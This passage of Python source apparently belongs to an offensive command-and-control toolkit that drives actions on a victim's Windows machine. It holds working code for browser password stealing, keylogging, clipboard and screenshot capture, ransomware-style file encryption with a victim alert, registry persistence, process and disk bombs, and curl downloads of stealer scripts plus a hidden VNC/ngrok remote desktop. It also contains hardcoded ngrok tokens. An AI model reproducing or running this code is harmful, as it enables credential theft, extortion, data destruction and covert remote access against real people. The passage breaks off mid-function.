                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_opera_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_opera_passwords)
                c2_terminal_command_thread.start()
        elif function == "Vivaldi Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_vivaldi_passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_vivaldi_passwords)
                c2_terminal_command_thread.start()
        elif function == "Opera GX Passwords":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_opera_gx__passwords)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_opera_gx__passwords)
                c2_terminal_command_thread.start()
        elif function == "Reboot System":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_reboot_system)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_reboot_system)
                c2_terminal_command_thread.start()
        elif function == "Shutdown System":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_shutdown_system)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_shutdown_system)
                c2_terminal_command_thread.start()
        elif function == "Set Reboot Persistent":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_set_reboot_persistent)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_set_reboot_persistent)
                c2_terminal_command_thread.start()
        elif function== "Get Location":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_get_location)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_get_location)
                c2_terminal_command_thread.start()
        elif function=="Get Clipboard":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_get_clipboard)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_get_clipboard)
                c2_terminal_command_thread.start()
        elif function=="Keylogger":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_keylogger)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_keylogger)
                c2_terminal_command_thread.start()
        elif function=="Show pop-up window":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_show_popup_window)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_show_popup_window)
                c2_terminal_command_thread.start()           
        elif function=="Voice Message":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_voice_message)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_voice_message)
                c2_terminal_command_thread.start()            
        elif function=="Make Screenshot":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_make_screenshot)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_make_screenshot)
                c2_terminal_command_thread.start()       
        elif function=="Encrypt File(s)":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_files)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_files)
                c2_terminal_command_thread.start()     
        elif function=="Encrypt All Files":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function} (Wait several minutes)\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')  
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_all_files)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function} (Wait several minutes)\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end') 
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_all_files)
                c2_terminal_command_thread.start()     

        elif function =="List Encrypted File(s)":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_list_encrypted_files)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_list_encrypted_files)
                c2_terminal_command_thread.start()   
        elif function =="Encrypt All Files with victim alert":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_all_files_with_alert)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_encrypt_all_files_with_alert)
                c2_terminal_command_thread.start()   
        elif function=="Decrypt File(s)":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_decrypt_files)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_decrypt_files)
                c2_terminal_command_thread.start()     
        elif function=="Decrypt All Files":
            if not self.remote_execute("echo %cd%"):
                self.remote_execute("")
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_decrypt_all_files)
                c2_terminal_command_thread.start()
            else:
                pwd=self.remote_execute("echo %cd%")
                result=f"{pwd}>{function}\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.configure(state="normal")
                self.c2_listening_terminal.insert("end", result, "rojo")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.see('end')
                c2_terminal_command_thread=threading.Thread(target=self.c2_decrypt_all_files)
                c2_terminal_command_thread.start()     


    def powershell_mode(self):
        self.c2_powershell_mode=True
        self.c2_command_terminal=ctk.CTkEntry(self.c2_frame,textvariable=self.command,width=398,height=30,fg_color="#0078D7",bg_color="#171717",text_color="#EEEFF0",font=("Hack Nerd Font",16),border_color="#EEEFF0")
        self.c2_command_terminal.place(x=40,y=100)

        c2_terminal_command_thread=threading.Thread(target=self.c2_terminal_command_thread)
        c2_terminal_command_thread.start()


    def cmd_mode(self):
        self.c2_powershell_mode=False
        self.c2_command_terminal=ctk.CTkEntry(self.c2_frame,textvariable=self.command,width=398,height=30,fg_color="black",bg_color="black",text_color="#EEEFF0",font=("Hack Nerd Font",16),border_color="#EEEFF0")
        self.c2_command_terminal.place(x=40,y=100)


        c2_terminal_command_thread=threading.Thread(target=self.c2_terminal_command_thread)
        c2_terminal_command_thread.start()


    def c2_set_perisistent(self):

        dialog = ctk.CTkInputDialog(text="Type the malware filename:", title="Malware Path",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
        malware_filename = dialog.get_input()  

        command=f"where {malware_filename}"
        malware_path=self.remote_execute(command).strip()

        if malware_path:
            command=f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{malware_filename}" /t REG_SZ /d "{malware_path}" /f'
            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "Malware filename not found\n\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')



    def c2_remote_desktop(self):

        command='curl -L -o %USERPROFILE%\\ngrok.exe "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/ngrok.exe"'
        self.remote_execute(command)

        command='dir %tmp% | findstr UltraVNC'
        result=self.remote_execute(command)
        print(result)
        if not result.strip():
            command='curl -L -o %tmp%\\UltraVNC.zip "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/UltraVNC.zip"'
            self.remote_execute(command)
            command='tar -xf %tmp%\\UltraVNC.zip'
            self.remote_execute(command)
            command='move UltraVNC %tmp%'
            self.remote_execute(command)

        command='tasklist | findstr winvnc'
        result=self.remote_execute(command)
        if not result.strip(): 
            command='powershell Start-Process "cmd.exe" -ArgumentList \'/K "%tmp%\\UltraVNC\\winvnc.exe\' -WindowStyle Hidden"'
            self.remote_execute(command)
            

        command='%USERPROFILE%\\ngrok.exe config add-authtoken 2vxSwpd8U5JReKWhwqrxrMn5Dt5_L7qiNZJHzJdQf1mSYcdi'
        self.remote_execute(command)


        command='powershell Start-Process "cmd.exe" -ArgumentList \'/K "%USERPROFILE%\\ngrok.exe" tcp 5900\' -WindowStyle Hidden"'
        self.remote_execute(command)

        time.sleep(1)

        ngrok_api="2vxf7mypcDSsBz68OLHGMdYNraI_4DxzXhySYVGJyfYU6oEub"

        headers = {
        "Authorization": f"Bearer {ngrok_api}",
        "Ngrok-Version": "2"
             }

        response = requests.get("https://api.ngrok.com/tunnels", headers=headers)

        data = response.json()

        try:
            public_url = data["tunnels"][0]["public_url"].split("://")[1]
            ip = public_url.split(":")[0]
            port = public_url.split(":")[1]

            vnc_address=ip+":"+port
            vnc_command=f"vncviewer {vnc_address} -passwd scripts/passwd"
        except:
            result="Error ngrok service could not be started"+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

        subprocess.run(["apt install tigervnc-viewer -y"],shell=True,check=True)
        subprocess.run(["7z x scripts/passwd.zip"],shell=True,check=True)
        subprocess.run(["mv passwd scripts"],shell=True,check=True)
        subprocess.run([vnc_command],shell=True,check=True)

            
        command='rmdir /q /s UltraVNC'
        self.remote_execute(command)
        
        result="VNC service stopped"+"\n\n"
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')

        subprocess.run(["rm -f scripts/passwd"],shell=True,check=True)


    def c2_powershell_bomb(self):
        command='powershell while ($true) { Start-Process powershell -ArgumentList "-NoExit" }'
        self.remote_execute(command)


    def c2_disk_bomb(self):
        command = "powershell -Command \"$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -gt 0 }; $i = 0; while ($true) { foreach ($d in $drives) { $paths = @('tempdata','Users\\Public\\Logs','ProgramData\\Cache'); foreach ($p in $paths) { $fullPath = \\\"$($d.Root)$p\\\"; New-Item -ItemType Directory -Path $fullPath -Force | Out-Null; $f = \\\"$fullPath\\syslog_$i.txt\\\"; '0'*50MB | Out-File $f; attrib +h +s $f; $i++ } } }\""
        self.remote_execute(command)

    def c2_install_python(self):

        python_path_installed=self.remote_execute('python --version')
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")
        if not python_installed.strip() and not python_path_installed.strip():

            command='curl -L -o %tmp%\\python-3.13.3-amd64.exe "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/python-3.13.3-amd64.exe'
            self.remote_execute(command)

            command='%tmp%\\python-3.13.3-amd64.exe /quiet InstallAllUsers=0 TargetDir="%USERPROFILE%\Python313" Include_launcher=1'
            self.remote_execute(command)

            command='%USERPROFILE%\\Python313\\python.exe --version'
            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

        elif python_path_installed:
            command='python --version'
            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            command='%USERPROFILE%\\Python313\\python.exe --version'
            result=self.remote_execute(command)+"\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')




    def c2_firefox_passwords(self):
        command='curl -L -o %tmp%\\script.py https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/firefox_decrypt.py'
        self.remote_execute(command)

        command='dir %APPDATA%\\Mozilla\\Firefox\\Profiles'
        profiles=self.remote_execute(command)
        if profiles:
            profile=[profile for profile in profiles.split() if "release" in profile]
        else:
            result="Firefox not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")
        if python_installed:

            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\script.py %APPDATA%\Mozilla\Firefox\Profiles\{profile[0]}'
            result=self.remote_execute(command)+"\n\n"
            if not result.strip():
                result="No saved passwords found in Firefox"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            command='del %tmp%\script.py'
            self.remote_execute(command)
        elif python_path_installed:
            command=f'python %tmp%\script.py %APPDATA%\Mozilla\Firefox\Profiles\{profile[0]}'
            result=self.remote_execute(command)+"\n\n"
            if not result.strip():
                result="No saved passwords found in Firefox\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            command='del %tmp%\script.py'
            self.remote_execute(command)
        else:
            self.c2_install_python()
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\script.py %APPDATA%\Mozilla\Firefox\Profiles\{profile[0]}'
            result=self.remote_execute(command)+"\n\n"
            if not result.strip():
                result="No saved passwords found in Firefox"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            command='del %tmp%\script.py'
            self.remote_execute(command)


    def c2_google_chrome_passwords(self):
        command='curl -L -o %tmp%\\Stealer.zip https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/Stealer.zip'
        self.remote_execute(command)

        command='dir "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data"'
        profiles=self.remote_execute(command)
        if not profiles:
            result="Google Chrome not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
            return

        python_path_installed=self.remote_execute("python --version")
        python_installed=self.remote_execute("%USERPROFILE%\\Python313\\python.exe --version")

        if python_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')
            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")


            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\chrome_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Google Chrome"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')
            self.remote_execute("python -m pip install pywin32")

            command=f'python %tmp%\\Stealer\\chrome_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
                result="No saved passwords found in Google Chrome"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                return


            secret_key=result.split("|")[-1]
            url=result.split("|")[1:][:-1][::4]
            user=result.split("|")[2:][::4]
            crypt_text=result.split("|")[3:][::4]
            self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")
            for url,user,crypt_text in zip(url,user,crypt_text):
                self.c2_listening_terminal.insert("end", f"Url: {url}\n", "white")
                self.c2_listening_terminal.insert("end", f"Username: {user}\n", "white")
                self.c2_listening_terminal.insert("end",f"Password: {self.decrypt_password(crypt_text,secret_key)}\n", "white")
                self.c2_listening_terminal.insert("end", "*"*82+"\n", "white")

            self.c2_listening_terminal.insert("end","\n", "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pywin32")
            command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\chrome_stealer.py'
            result=self.remote_execute(command)
            self.remote_execute('del %tmp%\\Stealer.zip')
            self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
            if len(result.split("|"))<2:
